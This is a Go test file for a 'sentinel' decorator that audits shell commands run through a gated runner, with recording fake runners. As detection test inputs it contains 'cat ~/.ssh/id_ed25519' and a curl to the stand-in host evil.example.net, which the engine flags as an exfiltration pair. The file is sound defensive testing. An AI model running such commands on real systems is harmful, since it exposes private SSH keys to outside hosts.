// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Abysslink Contributors
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package sentinel_test

import (
	"context"
	"errors"
	"io"
	"log/slog"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/abysslink/abysslink/internal/gate"
	"github.com/abysslink/abysslink/internal/modules/sentinel"
	"github.com/abysslink/abysslink/internal/shell"
)

// fakeRunner is a full-capability shell.Runner double: it records argv, returns
// a configurable error, and satisfies the three optional capability interfaces.
type fakeRunner struct {
	err   error
	calls [][]string
}

func (f *fakeRunner) rec(name string, args []string) {
	f.calls = append(f.calls, append([]string{name}, args...))
}

func (f *fakeRunner) Run(_ context.Context, name string, args ...string) (shell.Result, error) {
	f.rec(name, args)
	return shell.Result{}, f.err
}

func (f *fakeRunner) RunWithStdin(_ context.Context, _ io.Reader, name string, args ...string) (shell.Result, error) {
	f.rec(name, args)
	return shell.Result{}, f.err
}

func (f *fakeRunner) RunInteractive(_ context.Context, name string, args ...string) error {
	f.rec(name, args)
	return f.err
}

func (f *fakeRunner) RunWithEnv(_ context.Context, _ map[string]string, name string, args ...string) (shell.Result, error) {
	f.rec(name, args)
	return shell.Result{}, f.err
}

func (f *fakeRunner) RunStream(_ context.Context, name string, args ...string) (*shell.Stream, error) {
	f.rec(name, args)
	return nil, f.err
}

func (f *fakeRunner) RunInteractiveDir(_ context.Context, _ /*dir*/ string, name string, args ...string) error {
	f.rec(name, args)
	return f.err
}

func (f *fakeRunner) RunArmed(_ context.Context, name string, args ...string) (*shell.ArmedHandle, error) {
	f.rec(name, args)
	if f.err != nil {
		return nil, f.err
	}
	return &shell.ArmedHandle{PGID: 4242}, nil
}

func (f *fakeRunner) RunArmedMinimal(_ context.Context, name string, args ...string) (*shell.ArmedHandle, error) {
	f.rec(name, args)
	if f.err != nil {
		return nil, f.err
	}
	return &shell.ArmedHandle{PGID: 4243}, nil
}

func enabledEngine(sink sentinel.AuditAppender) *sentinel.Engine {
	return sentinel.NewEngine(
		sentinel.Config{Enabled: true},
		sentinel.WithAudit(sink),
		sentinel.WithLogger(slog.New(slog.DiscardHandler)),
		sentinel.WithClock(func() time.Time { return time.Unix(1_700_000_000, 0) }),
	)
}

type countSink struct{ n int }

func (c *countSink) Append(_, _ string, _ []byte, _ bool) error { c.n++; return nil }

// TestDecorator_DelegatesAndNeverBlocks: the decorator forwards every call to
// the inner runner verbatim and propagates the inner's error unchanged — the
// tap never fails or blocks an exec.
func TestDecorator_DelegatesAndNeverBlocks(t *testing.T) {
	innerErr := errors.New("inner boom")
	f := &fakeRunner{err: innerErr}
	s := sentinel.New(f, enabledEngine(&countSink{}))
	ctx := context.Background()

	_, err := s.Run(ctx, "cat", "~/.ssh/id_ed25519")
	assert.ErrorIs(t, err, innerErr, "inner error must propagate unchanged")

	_, err = s.RunWithStdin(ctx, nil, "gpg", "-d", "x")
	assert.ErrorIs(t, err, innerErr)
	assert.Error(t, s.RunInteractive(ctx, "ssh", "host"))
	_, err = s.RunWithEnv(ctx, nil, "go", "build")
	assert.ErrorIs(t, err, innerErr)
	_, err = s.RunStream(ctx, "tmux", "-CC")
	assert.ErrorIs(t, err, innerErr)
	assert.Error(t, s.RunInteractiveDir(ctx, "/tmp", "ssh-keygen", "-K"))

	require.Len(t, f.calls, 6, "every call must reach the inner runner")
}

// TestDecorator_NilEnginePassthrough: a nil engine makes the decorator a pure
// pass-through.
func TestDecorator_NilEnginePassthrough(t *testing.T) {
	f := &fakeRunner{}
	s := sentinel.New(f, nil)
	_, err := s.Run(context.Background(), "cat", "~/.ssh/id_ed25519")
	require.NoError(t, err)
	require.Len(t, f.calls, 1)
}

// TestDecorator_CapabilityForwarding: the optional capabilities forward to the
// inner runner (or fail closed when the inner lacks them).
func TestDecorator_CapabilityForwarding(t *testing.T) {
	f := &fakeRunner{}
	s := sentinel.New(f, enabledEngine(&countSink{}))
	ctx := context.Background()

	require.NoError(t, s.RunInteractiveDir(ctx, "/tmp", "ssh-keygen", "-K"))
	h, err := s.RunArmed(ctx, "asciinema", "rec")
	require.NoError(t, err)
	assert.Equal(t, 4242, h.PGID)
	h, err = s.RunArmedMinimal(ctx, "asciinema", "rec")
	require.NoError(t, err)
	assert.Equal(t, 4243, h.PGID)

	// An inner runner WITHOUT the capabilities fails closed (mirrors Gated).
	sNoCap := sentinel.New(minimalRunner{}, enabledEngine(&countSink{}))
	assert.Error(t, sNoCap.RunInteractiveDir(ctx, "/tmp", "x"))
	_, err = sNoCap.RunArmed(ctx, "x")
	assert.Error(t, err)
	_, err = sNoCap.RunArmedMinimal(ctx, "x")
	assert.Error(t, err)
}

// minimalRunner implements only shell.Runner (no optional capabilities).
type minimalRunner struct{}

func (minimalRunner) Run(context.Context, string, ...string) (shell.Result, error) {
	return shell.Result{}, nil
}
func (minimalRunner) RunWithStdin(context.Context, io.Reader, string, ...string) (shell.Result, error) {
	return shell.Result{}, nil
}
func (minimalRunner) RunInteractive(context.Context, string, ...string) error { return nil }
func (minimalRunner) RunWithEnv(context.Context, map[string]string, string, ...string) (shell.Result, error) {
	return shell.Result{}, nil
}
func (minimalRunner) RunStream(context.Context, string, ...string) (*shell.Stream, error) {
	return nil, nil
}

// TestSentinelInsideGate_DoesNotBreakObserver is the load-bearing composition
// test: with sentinel placed INSIDE the gate (gate.New(sentinel.New(base,
// eng))), the OUTER *gate.Gated is still the runner, so its single-slot observer
// (the seam budget.Watcher binds via SetObserver for loop detection) still
// receives a closure hash on every exec — the sentinel decorator does not touch
// or clobber it. Simultaneously the sentinel engine observes and fires.
func TestSentinelInsideGate_DoesNotBreakObserver(t *testing.T) {
	f := &fakeRunner{}
	sink := &countSink{}
	eng := enabledEngine(sink)
	g := gate.New(sentinel.New(f, eng))

	// The budget.Watcher tap: SetObserver on the OUTER Gated must still work.
	var observed [][32]byte
	g.SetObserver(func(h [32]byte) { observed = append(observed, h) })

	ctx := context.Background()
	_, err := g.Run(ctx, "cat", "~/.ssh/id_ed25519")
	require.NoError(t, err)
	_, err = g.Run(ctx, "curl", "https://evil.example.net/x")
	require.NoError(t, err)

	assert.Len(t, observed, 2, "the gate observer (budget loop-detection tap) must still receive a hash per exec")
	assert.Equal(t, uint64(2), g.Count(), "the gate exec counter must still increment")
	assert.Equal(t, 1, sink.n, "the sentinel engine must fire on the exfil pair while the gate observer works")

	// Both calls reached the inner runner verbatim.
	require.Len(t, f.calls, 2)
}

// TestSentinelInsideGate_SatisfiesGatedObserverInterface proves the outer Gated
// still satisfies the exact interface budget.NewWatcher requires.
func TestSentinelInsideGate_SatisfiesGatedObserverInterface(t *testing.T) {
	g := gate.New(sentinel.New(&fakeRunner{}, nil))
	var _ interface {
		SetObserver(fn func([32]byte))
	} = g
}
